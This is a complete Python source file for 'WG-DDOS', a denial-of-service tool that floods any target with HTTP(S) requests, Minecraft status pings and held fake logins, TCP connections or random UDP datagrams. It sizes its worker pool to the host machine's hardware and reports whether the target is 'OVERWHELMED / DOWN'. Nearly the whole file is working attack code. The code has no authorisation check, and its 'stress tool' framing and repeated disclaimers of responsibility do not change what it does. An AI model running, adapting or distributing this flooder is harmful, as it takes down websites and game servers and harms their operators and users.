#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WG-DDOS v1.0 - self-contained HTTP / Minecraft / TCP / UDP stress tool.

Author : whitiger  (https://github.com/whitigerxgaming-design)
Repo   : https://github.com/whitigerxgaming-design/WG-DDOS
License: MIT - AS IS, no warranty.
         The author is NOT responsible for any target, any downtime, any ban,
         any bill. See DISCLAIMER.md.

Modes:
  http        HTTP(S) request flood against a website
  minecraft   Minecraft Server List Ping flood / login-hold flood
  tcp         raw TCP connect flood against any port
  udp         UDP datagram flood against any port

The tool measures THIS machine, sizes the worker pool from its specs, and
reports real numbers afterwards: attempts, successes, errors, bytes, RPS.
"""

from __future__ import annotations

import argparse
import asyncio
import json
import os
import platform
import random
import socket
import ssl
import string
import struct
import sys
import time
from datetime import datetime, timezone

VERSION = "1.0.0"
AUTHOR = "whitiger"
REPO = "https://github.com/whitigerxgaming-design/WG-DDOS"
HERE = os.path.dirname(os.path.abspath(__file__))
REPORT_DIR = os.path.join(HERE, "reports")

UA = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
    "curl/8.5.0",
]

BANNER = r"""
 __      __  ____    ____    ____    ___    ___
 \ \    / / / __ \  |  _ \  |  _ \  / _ \  / __|
  \ \/\/ / | |  | | | | | | | | | || | | | \__ \
   \_/\_/  | |__| | | |_| | | |_| || |_| | |___) |
           |_____/  |____/  |____/  \___/  |____/
 WG-DDOS v{ver} - by whitiger - AS IS, no warranty
 {repo}
 The author is NOT responsible for any target.
"""

# per-core / per-GB worker multipliers and hard caps, per mode
PROFILE = {
    "http":      {"core": 96,  "gb": 384, "cap": 4000, "est": 8},
    "minecraft": {"core": 24,  "gb": 96,  "cap": 1500, "est": 25},
    "tcp":       {"core": 48,  "gb": 128, "cap": 3000, "est": 15},
    "udp":       {"core": 8,   "gb": 32,  "cap": 64,   "est": 40000},
}
DEFAULT_PORT = {"http": 0, "minecraft": 25565, "tcp": 80, "udp": 53}


# --------------------------------------------------------------------------- #
# helpers
# --------------------------------------------------------------------------- #
def human_bytes(n: float) -> str:
    for unit in ("B", "KB", "MB", "GB", "TB"):
        if n < 1024:
            return f"{n:.0f} {unit}"
        n /= 1024
    return f"{n:.1f} PB"


def varint(n: int) -> bytes:
    out = bytearray()
    while True:
        b = n & 0x7F
        n >>= 7
        if n:
            out.append(b | 0x80)
        else:
            out.append(b)
            return bytes(out)


def mc_handshake(host: str, port: int, state: int, proto: int = 767) -> bytes:
    h = host.encode()
    body = varint(0x00) + varint(proto) + varint(len(h)) + h + struct.pack(">H", port) + varint(state)
    return varint(len(body)) + body


def rand_name() -> str:
    return "WG_" + "".join(random.choices(string.ascii_letters + string.digits, k=8))


def rand_path(base: str, enabled: bool) -> str:
    if not enabled:
        return base
    sep = "&" if "?" in base else "?"
    return f"{base}{sep}_={random.getrandbits(32):x}"


def total_ram_gb() -> float:
    try:
        if sys.platform.startswith("linux"):
            with open("/proc/meminfo", "r", encoding="utf-8") as fh:
                for line in fh:
                    if line.startswith("MemTotal:"):
                        return int(line.split()[1]) / 1048576.0
    except OSError:
        pass
    try:
        import psutil  # optional
        return psutil.virtual_memory().total / (1024 ** 3)
    except Exception:
        return 4.0


def specs() -> dict:
    return {
        "cores": os.cpu_count() or 1,
        "ram_gb": round(total_ram_gb(), 1),
        "platform": f"{platform.system()} {platform.machine()}",
        "python": platform.python_version(),
    }


def plan_workers(sp: dict, mode: str, override) -> int:
    if override:
        return max(1, override)
    p = PROFILE[mode]
    by_cpu = sp["cores"] * p["core"]
    by_ram = int(sp["ram_gb"] * p["gb"])
    return max(1, min(by_cpu, by_ram, p["cap"]))


# --------------------------------------------------------------------------- #
# stats
# --------------------------------------------------------------------------- #
class Stats:
    def __init__(self) -> None:
        self.sent = 0
        self.ok = 0
        self.err = 0
        self.bytes = 0
        self.peak = 0
        self.t0 = time.monotonic()

    @property
    def elapsed(self) -> float:
        return max(time.monotonic() - self.t0, 1e-9)

    def rate(self) -> float:
        return self.sent / self.elapsed


# --------------------------------------------------------------------------- #
# target pre-flight
# --------------------------------------------------------------------------- #
def resolve(host: str, port: int) -> str:
    try:
        infos = socket.getaddrinfo(host, port, proto=socket.IPPROTO_TCP)
        return infos[0][4][0]
    except OSError:
        return "unresolved"


def preflight(host: str, port: int, mode: str) -> bool:
    print(f"[*] Resolving {host} ...")
    ip = resolve(host, port)
    if ip == "unresolved":
        print("[x] DNS failed. Target may be wrong or offline.")
        return False
    print(f"[+] Resolved to {ip}")
    if mode == "udp":
        print("[+] UDP: reachability cannot be verified, continuing")
        return True
    try:
        with socket.create_connection((host, port), timeout=6):
            print(f"[+] TCP {port} is open")
        return True
    except OSError as exc:
        print(f"[!] TCP {port} unreachable ({exc}) - attacking anyway")
        return True


# --------------------------------------------------------------------------- #
# workers
# --------------------------------------------------------------------------- #
async def http_worker(url: str, host_header, cfg: dict, st: Stats, stop: asyncio.Event) -> None:
    import aiohttp

    ctx = None
    if url.startswith("https"):
        ctx = ssl.create_default_context()
        if not cfg["verify"]:
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE

    headers = {
        "User-Agent": random.choice(UA),
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache",
    }
    if host_header:
        headers["Host"] = host_header

    conn = aiohttp.TCPConnector(limit=0, ssl=ctx, force_close=not cfg["keepalive"])
    to = aiohttp.ClientTimeout(total=cfg["timeout"])
    async with aiohttp.ClientSession(connector=conn, timeout=to, headers=headers) as ses:
        while not stop.is_set():
            target = url + rand_path(cfg["path"], cfg["rand"])
            st.sent += 1
            try:
                async with ses.request(cfg["method"], target, allow_redirects=False) as resp:
                    body = await resp.read()
                    st.ok += 1
                    st.bytes += len(body) + 200
            except Exception:
                st.err += 1


async def mc_ping_worker(host: str, port: int, cfg: dict, st: Stats, stop: asyncio.Event) -> None:
    while not stop.is_set():
        st.sent += 1
        try:
            rd, wr = await asyncio.wait_for(asyncio.open_connection(host, port), cfg["timeout"])
            wr.write(mc_handshake(host, port, 1) + b"\x01\x00")
            await wr.drain()
            data = await asyncio.wait_for(rd.read(2048), cfg["timeout"])
            st.bytes += len(data)
            if data:
                st.ok += 1
            else:
                st.err += 1
            wr.close()
        except Exception:
            st.err += 1


async def mc_join_worker(host: str, port: int, cfg: dict, st: Stats, stop: asyncio.Event) -> None:
    while not stop.is_set():
        st.sent += 1
        try:
            rd, wr = await asyncio.wait_for(asyncio.open_connection(host, port), cfg["timeout"])
            name = rand_name().encode()
            body = b"\x00" + varint(len(name)) + name
            wr.write(mc_handshake(host, port, 2) + varint(len(body)) + body)
            await wr.drain()
            data = await asyncio.wait_for(rd.read(512), cfg["timeout"])
            st.bytes += len(data)
            if data:
                st.ok += 1
            else:
                st.err += 1
            await asyncio.sleep(cfg["hold"])
            wr.close()
        except Exception:
            st.err += 1


async def tcp_worker(host: str, port: int, cfg: dict, st: Stats, stop: asyncio.Event) -> None:
    while not stop.is_set():
        st.sent += 1
        try:
            rd, wr = await asyncio.wait_for(asyncio.open_connection(host, port), cfg["timeout"])
            st.ok += 1
            st.bytes += 40
            if cfg["hold"] > 0:
                await asyncio.sleep(cfg["hold"])
            wr.close()
        except Exception:
            st.err += 1


async def udp_worker(host: str, port: int, cfg: dict, st: Stats, stop: asyncio.Event) -> None:
    loop = asyncio.get_running_loop()
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setblocking(False)
    try:
        sock.connect((host, port))
    except OSError:
        pass
    while not stop.is_set():
        payload = os.urandom(random.randint(64, 1024))
        st.sent += 1
        try:
            await loop.sock_sendall(sock, payload)
            st.ok += 1
            st.bytes += len(payload)
        except Exception:
            st.err += 1
        await asyncio.sleep(0)
    sock.close()


# --------------------------------------------------------------------------- #
# reporter
# --------------------------------------------------------------------------- #
async def reporter(st: Stats, stop: asyncio.Event, quiet: bool) -> None:
    if quiet:
        return
    last = 0
    while not stop.is_set():
        await asyncio.sleep(1.0)
        cur = st.sent
        delta = cur - last
        st.peak = max(st.peak, delta)
        last = cur
        sys.stdout.write(
            f"\r[{st.elapsed:7.1f}s] sent={st.sent:>10,} ok={st.ok:>10,} "
            f"err={st.err:>8,} | {delta:>7,}/s | {human_bytes(st.bytes):>9}"
        )
        sys.stdout.flush()
    sys.stdout.write("\n")


# --------------------------------------------------------------------------- #
# report
# --------------------------------------------------------------------------- #
def verdict(st: Stats):
    if st.sent == 0:
        return "NO TRAFFIC", "Target never accepted a connection"
    ratio = st.err / st.sent
    if ratio < 0.10:
        return "TARGET HELD", f"clean {ratio * 100:.1f}% error rate"
    if ratio < 0.50:
        return "TARGET DEGRADED", f"{ratio * 100:.1f}% error rate, partial failure"
    return "TARGET OVERWHELMED / DOWN", f"{ratio * 100:.1f}% error rate after warm-up"


def build_report(args, sp: dict, workers: int, st: Stats) -> dict:
    v, why = verdict(st)
    return {
        "tool": f"WG-DDOS {VERSION}",
        "author": AUTHOR,
        "repo": REPO,
        "generated": datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ"),
        "disclaimer": "AS IS, no warranty. Author not responsible for any target.",
        "target": args.target,
        "resolved_ip": args.ip,
        "port": args.port,
        "mode": args.mode,
        "method": args.method if args.mode == "http" else None,
        "duration_s": round(st.elapsed, 2),
        "host_specs": sp,
        "workers": workers,
        "attempts": st.sent,
        "succeeded": st.ok,
        "failed": st.err,
        "error_pct": round(st.err / st.sent * 100, 2) if st.sent else 0.0,
        "bytes": st.bytes,
        "bytes_human": human_bytes(st.bytes),
        "peak_rate": st.peak,
        "avg_rate": round(st.rate(), 1),
        "verdict": v,
        "verdict_reason": why,
    }


def save_report(rep: dict) -> str:
    os.makedirs(REPORT_DIR, exist_ok=True)
    stamp = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H-%M-%SZ")
    base = os.path.join(REPORT_DIR, f"report-{stamp}")

    with open(base + ".json", "w", encoding="utf-8") as fh:
        json.dump(rep, fh, indent=2)

    lines = [
        "# WG-DDOS report",
        "",
        f"Generated: {rep['generated']}  |  by {AUTHOR}  |  AS IS, no warranty.",
        "",
        f"- Target: `{rep['target']}` ({rep['resolved_ip']}:{rep['port']})",
        f"- Mode: {rep['mode']} {rep['method'] or ''}".rstrip(),
        f"- Duration: {rep['duration_s']} s",
        f"- Host: {rep['host_specs']['platform']}, {rep['host_specs']['cores']} cores, "
        f"{rep['host_specs']['ram_gb']} GB RAM",
        f"- Workers: {rep['workers']}",
        "",
        "| Metric | Value |",
        "|---|---|",
        f"| Attempts | {rep['attempts']:,} |",
        f"| Succeeded | {rep['succeeded']:,} |",
        f"| Failed | {rep['failed']:,} ({rep['error_pct']}%) |",
        f"| Data pushed | {rep['bytes_human']} |",
        f"| Peak rate | {rep['peak_rate']:,}/s |",
        f"| Average rate | {rep['avg_rate']:,}/s |",
        "",
        f"**Verdict: {rep['verdict']}** - {rep['verdict_reason']}",
        "",
        "> Author is not responsible for any target. See DISCLAIMER.md",
    ]
    with open(base + ".md", "w", encoding="utf-8") as fh:
        fh.write("\n".join(lines) + "\n")
    return base + ".md"


# --------------------------------------------------------------------------- #
# main
# --------------------------------------------------------------------------- #
async def run(args, sp: dict, workers: int) -> int:
    st = Stats()
    stop = asyncio.Event()
    cfg = {
        "timeout": args.timeout,
        "hold": args.hold,
        "path": args.path,
        "rand": args.rand,
        "method": args.method,
        "verify": args.verify_tls,
        "keepalive": True,
    }

    rep_task = asyncio.create_task(reporter(st, stop, args.quiet))

    async def spawn() -> None:
        tasks = []
        for _ in range(workers):
            if args.mode == "http":
                tasks.append(asyncio.create_task(http_worker(args.url, args.host_header, cfg, st, stop)))
            elif args.mode == "minecraft":
                fn = mc_join_worker if args.mc_mode == "join" else mc_ping_worker
                tasks.append(asyncio.create_task(fn(args.host, args.port, cfg, st, stop)))
            elif args.mode == "tcp":
                tasks.append(asyncio.create_task(tcp_worker(args.host, args.port, cfg, st, stop)))
            else:
                tasks.append(asyncio.create_task(udp_worker(args.host, args.port, cfg, st, stop)))
        await asyncio.gather(*tasks, return_exceptions=True)

    runner = asyncio.create_task(spawn())
    try:
        await asyncio.sleep(args.duration)
    finally:
        stop.set()
        try:
            await asyncio.wait_for(runner, 8)
        except asyncio.TimeoutError:
            runner.cancel()
        rep_task.cancel()

    rep = build_report(args, sp, workers, st)
    path = save_report(rep)

    print("\n" + "=" * 50)
    print(" WG-DDOS REPORT")
    print("=" * 50)
    print(f" Target       : {args.target} ({args.ip}:{args.port})")
    print(f" Mode         : {args.mode} {args.method if args.mode == 'http' else ''}".rstrip())
    print(f" Duration     : {rep['duration_s']} s")
    print(f" Workers      : {workers}")
    print(f" Attempts     : {st.sent:,}")
    print(f" Succeeded    : {st.ok:,}")
    print(f" Failed       : {st.err:,} ({rep['error_pct']}%)")
    print(f" Data pushed  : {rep['bytes_human']}")
    print(f" Peak rate    : {st.peak:,}/s")
    print(f" Average rate : {rep['avg_rate']:,}/s")
    print(f" Verdict      : {rep['verdict']} - {rep['verdict_reason']}")
    print(f" Report saved : {os.path.relpath(path, HERE)}")
    print("=" * 50)
    print(" AS IS, no warranty. Author not responsible for any target.")
    return 0


def normalize_http(target: str):
    if "://" not in target:
        target = "http://" + target
    port = 443 if target.startswith("https://") else 80
    rest = target.split("://", 1)[1]
    hostport = rest.split("/", 1)[0]
    host = hostport.split(":")[0]
    if ":" in hostport:
        try:
            port = int(hostport.split(":")[1])
        except ValueError:
            pass
    return target.rstrip("/"), host, port


def cmd_specs() -> int:
    sp = specs()
    print(BANNER.format(ver=VERSION, repo=REPO))
    print(" This machine:")
    print(f"  CPU cores ....... {sp['cores']}")
    print(f"  RAM ............. {sp['ram_gb']} GB")
    print(f"  Platform ........ {sp['platform']}")
    print(f"  Python .......... {sp['python']}")
    print("\n Auto-sized worker pool per mode:")
    for mode in ("http", "minecraft", "tcp", "udp"):
        w = plan_workers(sp, mode, None)
        print(f"  {mode:<10} {w:>6} workers  (~{w * PROFILE[mode]['est']:,}/s est. ceiling)")
    print("\n Estimates are ceilings, not promises. The report has the truth.")
    print(" AS IS, no warranty. Author not responsible for any target.")
    return 0


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="wgddos",
        description="WG-DDOS by whitiger - AS IS, no warranty. Author not responsible for any target.",
    )
    p.add_argument("-V", "--version", action="version", version=f"WG-DDOS {VERSION} by {AUTHOR}")
    sub = p.add_subparsers(dest="cmd")

    def common(sp):
        sp.add_argument("--duration", type=float, default=30, help="seconds (default 30)")
        sp.add_argument("--workers", type=int, default=None, help="override auto-sized pool")
        sp.add_argument("--timeout", type=float, default=10, help="per-op timeout (default 10)")
        sp.add_argument("--hold", type=float, default=5, help="hold time for tcp/join (default 5)")
        sp.add_argument("--quiet", action="store_true", help="no live stats line")
        sp.add_argument("--plan-only", action="store_true", help="print plan, do not attack")
        sp.add_argument("--no-preflight", action="store_true", help="skip reachability check")

    h = sub.add_parser("http", help="HTTP(S) request flood")
    h.add_argument("target", help="URL or host, e.g. example.com")
    h.add_argument("--method", default="GET", choices=["GET", "POST", "HEAD", "OPTIONS"])
    h.add_argument("--path", default="/", help="base path (default /)")
    h.add_argument("--rand", action="store_true", default=True, help="cache-busting paths (on)")
    h.add_argument("--no-rand", dest="rand", action="store_false")
    h.add_argument("--host-header", default=None, help="override Host header")
    h.add_argument("--verify-tls", action="store_true", help="enforce valid certificates")
    common(h)

    m = sub.add_parser("minecraft", help="Minecraft server flood")
    m.add_argument("target", help="server host or IP")
    m.add_argument("--port", type=int, default=25565)
    m.add_argument("--mc-mode", default="ping", choices=["ping", "join"],
                   help="ping = status flood, join = hold logins")
    common(m)

    t = sub.add_parser("tcp", help="TCP connect flood")
    t.add_argument("target")
    t.add_argument("--port", type=int, default=80)
    common(t)

    u = sub.add_parser("udp", help="UDP datagram flood")
    u.add_argument("target")
    u.add_argument("--port", type=int, default=53)
    common(u)

    sub.add_parser("specs", help="show what this machine can do")
    return p


def main(argv) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)

    if args.cmd in (None, "specs"):
        return cmd_specs()

    args.mode = args.cmd
    sp = specs()

    if args.mode == "http":
        args.url, args.host, args.port = normalize_http(args.target)
        args.mc_mode = None
    else:
        args.host = args.target
        args.url = args.target
        args.host_header = None
        if not getattr(args, "mc_mode", None):
            args.mc_mode = None

    if args.mode == "udp":
        args.port = getattr(args, "port", 53)

    workers = plan_workers(sp, args.mode, args.workers)

    print(BANNER.format(ver=VERSION, repo=REPO))
    print(f" Target ............... {args.target}")
    print(f" Mode ................. {args.mode}"
          + (f" {args.mc_mode}" if args.mode == "minecraft" else "")
          + (f" {args.method}" if args.mode == "http" else ""))
    print(f" Port ................. {args.port or 'default'}")
    print(f" Duration ............. {args.duration}s")
    print(f" CPU cores ............ {sp['cores']}")
    print(f" RAM .................. {sp['ram_gb']} GB")
    print(f" Worker pool .......... {workers} concurrent clients")
    print(f" Estimated ceiling .... ~{workers * PROFILE[args.mode]['est']:,}/s")
    print()

    if not args.no_preflight:
        preflight(args.host, args.port, args.mode)

    args.ip = resolve(args.host, args.port)

    if args.plan_only:
        print("\n[*] plan-only: not attacking.")
        return 0

    try:
        return asyncio.run(run(args, sp, workers))
    except KeyboardInterrupt:
        print("\n[!] interrupted")
        return 130


if __name__ == "__main__":
    try:
        sys.exit(main(sys.argv[1:]))
    except KeyboardInterrupt:
        sys.exit(130)
